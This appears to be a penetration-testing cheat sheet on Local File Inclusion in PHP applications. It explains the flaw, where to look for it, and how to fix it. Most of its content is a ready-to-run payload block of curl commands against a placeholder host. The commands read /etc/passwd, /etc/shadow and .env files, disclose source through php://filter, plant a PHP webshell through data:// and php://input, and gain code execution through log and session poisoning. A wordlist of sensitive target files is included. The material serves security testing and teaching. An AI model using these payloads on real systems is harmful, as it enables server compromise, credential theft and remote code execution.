# Local File Inclusion (LFI)

## Overview
Local File Inclusion (LFI) allows an attacker to include files from the server's filesystem in the application's response. Unlike path traversal (which just reads files), LFI causes the server to execute or include the file — enabling code execution if the attacker can write to a file (via log poisoning, PHP session injection, file upload) that is then included. LFI is most severe in PHP applications but affects other stacks too.

## How It Works
- Vulnerable code: `include($_GET['page'] . '.php')` or `include($_GET['lang'])`.
- Basic LFI: `?page=../../../../etc/passwd` — includes the file, sending it in the response.
- **PHP Wrapper exploitation**:
  - `php://filter/convert.base64-encode/resource=index.php` — reads PHP source without execution.
  - `php://input` — uses POST body as included file content (if `allow_url_include=on`).
  - `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7` — embeds PHP code.
- **Log poisoning**: Inject PHP code in User-Agent header → read `/var/log/apache2/access.log` via LFI → code execution.
- **Session poisoning**: Write PHP code to a PHP session file → include `../../../tmp/sess_PHPSESSID`.

## Impact
- Information disclosure: reading server files.
- Remote Code Execution via log poisoning, session poisoning, `/proc/self/environ`.
- Source code disclosure via PHP wrappers.
- Complete server compromise.

## Where to Look
- `page=`, `lang=`, `file=`, `template=`, `view=`, `module=`, `inc=` parameters.
- Language/locale switchers: `?lang=en` → application loads `languages/en.php`.
- Theme or template selectors.
- Error page customizers.
- PHP applications (`include`, `require`, `include_once`, `require_once` calls).

## Testing Steps
1. Test for basic LFI: `?page=../../../../etc/passwd`.
2. Test with PHP wrapper: `?page=php://filter/convert.base64-encode/resource=index`.
3. Test null byte: `?page=../../../../etc/passwd%00` (PHP < 5.3.4).
4. Test log poisoning: Set User-Agent to `<?php system($_GET['cmd']); ?>`, then include the access log.
5. Test PHP session poisoning: Set a cookie value to PHP code, include the session file.
6. Test `/proc/self/environ` inclusion: it may contain user-supplied HTTP headers.

## Payloads / Techniques
```bash
# Basic LFI
curl -s "https://target.com/index.php?page=../../../../etc/passwd"
curl -s "https://target.com/?lang=../../../../etc/passwd"

# PHP filter - base64 encode to read source code (no .php needed)
curl -s "https://target.com/?page=php://filter/convert.base64-encode/resource=index"
# Then: echo "BASE64_OUTPUT" | base64 -d

# PHP filter with rot13
curl -s "https://target.com/?page=php://filter/read=string.rot13/resource=config"

# PHP input (RCE if allow_url_include=On)
curl -s -X POST "https://target.com/?page=php://input" \
  --data "<?php system('id'); ?>"

# Data URI (RCE if allow_url_include=On)
# PHP code: <?php system($_GET['cmd']); ?>
# Base64:   PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
curl -s "https://target.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id"

# Log poisoning - Step 1: Inject PHP code in User-Agent
curl -s "https://target.com/" -A "<?php system(\$_GET['cmd']); ?>"

# Log poisoning - Step 2: Include the log file
curl -s "https://target.com/?page=../../../../var/log/apache2/access.log&cmd=id"
curl -s "https://target.com/?page=../../../../var/log/nginx/access.log&cmd=id"

# PHP session poisoning - Step 1: Store PHP code in session
curl -s -c cookies.txt "https://target.com/index.php?input=<?php system(\$_GET['cmd']); ?>"

# PHP session poisoning - Step 2: Get session ID from cookies
SESSION_ID=$(grep PHPSESSID cookies.txt | awk '{print $7}')

# PHP session poisoning - Step 3: Include session file
curl -s "https://target.com/?page=../../../../var/lib/php/sessions/sess_$SESSION_ID&cmd=id"

# Proc environ (may contain injected User-Agent)
curl -s "https://target.com/?page=../../../../proc/self/environ"

# Interesting files for LFI
TARGETS=(
  "/etc/passwd"
  "/etc/shadow"
  "/etc/hosts"
  "/proc/self/environ"
  "/proc/self/cmdline"
  "/var/www/html/.env"
  "/var/www/html/config.php"
  "/etc/nginx/nginx.conf"
  "/etc/apache2/sites-enabled/default"
  "/var/log/apache2/access.log"
  "/var/log/nginx/access.log"
  "/var/lib/php/sessions/"
)
```

## Burp Suite Tips
- In **Intruder**, fuzz the path parameter with LFI wordlist from SecLists: `/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`.
- **Active Scanner** (Pro) tests for LFI automatically.
- Use **Repeater** to test PHP wrappers and log poisoning manually.
- Monitor response body length — a successful `/etc/passwd` inclusion will have a characteristic structure.

## Tools
- LFISuite — https://github.com/D35m0nd142/LFISuite (automated LFI exploitation)
- liffy — https://github.com/mzfr/liffy (LFI scanner)
- SecLists LFI wordlist: `/usr/share/seclists/Fuzzing/LFI/`

## Remediation
- Never pass user input directly to `include()`, `require()`, `file_get_contents()`, or similar functions.
- Use a whitelist of allowed file identifiers mapped to actual file paths (never use the identifier directly as a path).
- Disable `allow_url_include` and `allow_url_fopen` in `php.ini` if not needed.
- Validate and sanitize all path inputs: reject `../`, `./`, `php://`, `data://`, `file://` prefixes.
- Run PHP with open_basedir restriction to limit accessible paths.
- Use operating system-level isolation (chroot, containers) to restrict file system access.

## References
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_File_Inclusion
https://portswigger.net/web-security/file-path-traversal
https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/
https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
